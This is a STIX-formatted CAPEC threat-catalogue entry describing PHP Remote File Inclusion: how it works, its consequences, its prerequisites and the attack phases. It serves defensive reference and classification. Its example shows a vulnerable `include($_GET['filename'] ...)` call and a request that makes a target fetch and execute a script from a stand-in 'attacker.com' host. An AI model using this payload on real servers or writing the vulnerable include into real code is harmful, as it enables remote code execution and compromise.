{
    "id": "bundle--c339c916-fcc5-4aeb-be54-b9f3179716b8",
    "objects": [
        {
            "created": "2014-06-23T00:00:00.000Z",
            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
            "description": "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized \"include\" or \"require\" call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.",
            "external_references": [
                {
                    "external_id": "CAPEC-193",
                    "source_name": "capec",
                    "url": "https://capec.mitre.org/data/definitions/193.html"
                },
                {
                    "external_id": "CWE-98",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/98.html"
                },
                {
                    "external_id": "CWE-80",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/80.html"
                },
                {
                    "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
                    "external_id": "REF-59",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://projects.webappsec.org/Remote-File-Inclusion"
                },
                {
                    "description": "Shaun Clowes, A Study In Scarlet, Exploiting Common Vulnerabilities in PHP Applications, Blackhat Briefings Asia 2001",
                    "external_id": "REF-60",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://securereality.com.au/studyinscarlett/"
                },
                {
                    "description": "OWASP Top 10 2007 (2007), The Open Web Application Security Project (OWASP)",
                    "external_id": "REF-30",
                    "source_name": "reference_from_CAPEC",
                    "url": "https://www.owasp.org/www-pdf-archive/OWASP_Top_10_2007.pdf"
                },
                {
                    "description": "OWASP Vulnerabilities, The Open Web Application Security Project (OWASP)",
                    "external_id": "REF-621",
                    "source_name": "reference_from_CAPEC",
                    "url": "https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion"
                }
            ],
            "id": "attack-pattern--51cf3883-1993-49d1-a6c6-169cabf71adb",
            "modified": "2022-09-29T00:00:00.000Z",
            "name": "PHP Remote File Inclusion",
            "object_marking_refs": [
                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
            ],
            "type": "attack-pattern",
            "x_capec_abstraction": "Detailed",
            "x_capec_child_of_refs": [
                "attack-pattern--5a33bee7-5ec9-4e75-9bf6-99fdaca8699c"
            ],
            "x_capec_consequences": {
                "Access_Control": [
                    "Bypass Protection Mechanism"
                ],
                "Accountability": [
                    "Gain Privileges"
                ],
                "Authentication": [
                    "Gain Privileges"
                ],
                "Authorization": [
                    "Execute Unauthorized Commands (Run Arbitrary Code)",
                    "Gain Privileges",
                    "Bypass Protection Mechanism"
                ],
                "Confidentiality": [
                    "Read Data"
                ],
                "Integrity": [
                    "Modify Data"
                ],
                "Non-Repudiation": [
                    "Gain Privileges"
                ]
            },
            "x_capec_domains": [
                "Software"
            ],
            "x_capec_example_instances": [
                "\n               <xhtml:ul>\n                  <xhtml:li>The adversary controls a PHP script on a server \"http://attacker.com/rfi.txt\"</xhtml:li>\n                  <xhtml:li>The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt')</xhtml:li>\n                  <xhtml:li>The adversary creates an HTTP request that passes their own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the \".txt\" prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.</xhtml:li>\n               </xhtml:ul>\n            "
            ],
            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Survey application: </b>Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</td></tr><tr><td>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</td></tr><tr><td>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</td></tr></tbody></table></ol></div><div><h3>Experiment</h3><ol><li> <p> <b>Attempt variations on input parameters: </b>The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before. They send parameters that include variations of payloads which include a reference to the remote PHP script. They record all the responses from the server that include the output of the execution of remote PHP script.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script.</td></tr><tr><td>Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Run arbitrary server-side code: </b>As the adversary succeeds in exploiting the vulnerability, they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.</td></tr></tbody></table></ol></div>",
            "x_capec_likelihood_of_attack": "High",
            "x_capec_prerequisites": [
                "Target application server must allow remote files to be included in the \"require\", \"include\", etc. PHP directives",
                "The adversary must have the ability to make HTTP requests to the target web application."
            ],
            "x_capec_resources_required": [
                "None: No specialized resources are required to execute this type of attack."
            ],
            "x_capec_skills_required": {
                "Low": "To inject the malicious payload in a web page",
                "Medium": "To bypass filters in the application"
            },
            "x_capec_status": "Draft",
            "x_capec_typical_severity": "High",
            "x_capec_version": "3.9"
        }
    ],
    "spec_version": "2.0",
    "type": "bundle"
}